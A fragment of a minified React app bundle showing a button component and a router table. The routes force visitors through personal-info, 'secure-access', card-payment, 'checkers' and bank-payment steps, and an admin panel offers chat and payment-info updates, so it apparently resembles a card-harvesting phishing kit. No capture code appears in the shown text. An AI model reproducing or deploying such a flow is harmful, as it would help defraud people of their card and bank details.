w-full"}),g.jsx("button",{onClick:G,disabled:w,className:"bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-700 w-full sm:w-32 flex items-center justify-center",children:w?g.jsxs(g.Fragment,{children:[g.jsxs("svg",{className:"animate-spin -ml-1 mr-2 h-4 w-4 text-white",xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",children:[g.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4"}),g.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),"Adding"]}):"Add"})]})]})]})},Kz=W6([{path:"/",element:g.jsx(L5,{}),children:[{path:"/",element:g.jsx(Q5,{})},{path:"/checkout",element:g.jsx(Io,{element:g.jsx(K5,{})})},{path:"/provide-your-info",element:g.jsx(Io,{element:g.jsx(W5,{}),requiredPreviousRoute:"/checkout"})},{path:"/secure-access",element:g.jsx(Io,{element:g.jsx(Z5,{}),requiredPreviousRoute:"/provide-your-info"})},{path:"/card-payment",element:g.jsx(Io,{element:g.jsx(ZB,{}),requiredPreviousRoute:"/secure-access"})},{path:"/checkers",element:g.jsx(Io,{element:g.jsx(JB,{}),requiredPreviousRoute:"/card-payment"})},{path:"/bank-payment",element:g.jsx(Io,{element:g.jsx(ez,{}),requiredPreviousRoute:"/checkers"})},{path:"/payment-process",element:g.jsx(Io,{element:g.jsx(iz,{}),requiredPreviousRoute:"/bank-payment"})},{path:"/admin",element:g.jsx(rz,{})},{path:"/admin-panel",element:g.jsx(Gz,{children:g.jsx(oz,{})}),children:[{index:!0,element:g.jsx($E,{})},{path:"dashboard",element:g.jsx($E,{})},{path:"chat",element:g.jsx(Hz,{})},{path:"admin-role",element:g.jsx(qz,{})},{path:"payment-info-update",element:g.jsx(Yz,{})},{path:"payment-method-update",element:g.jsx(Qz,{})}]}]}]);J3.createRoot(document.getElementById("root")).render(g.jsx(O.StrictMode,{children:g.jsx(XB,{children:g.jsx(c5,{router:Kz})})}));
